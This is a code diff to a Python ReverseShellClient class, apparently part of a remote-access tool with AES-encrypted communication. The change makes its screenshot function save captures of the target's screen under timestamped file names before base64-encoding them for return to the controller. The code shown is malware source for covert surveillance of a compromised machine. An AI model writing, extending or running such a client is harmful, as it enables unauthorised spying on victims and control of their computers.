@@ -6,6 +6,7 @@ from aes_crypt import AESCipher
 from time import sleep
 from base64 import b64encode, b64decode
 from PIL import ImageGrab
+import datetime
 
 
 class ReverseShellClient:
@@ -104,9 +105,11 @@ class ReverseShellClient:
             return str(e)
 
     def take_screenshot(self):
+        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
+        file_name = f"screenshot_{timestamp}.png"
         screenshot = ImageGrab.grab()
-        screenshot.save("screenshot.png")
-        with open("screenshot.png", "rb") as f:
+        screenshot.save(file_name)
+        with open(file_name, "rb") as f:
             return b64encode(f.read()).decode("utf-8")
 
 
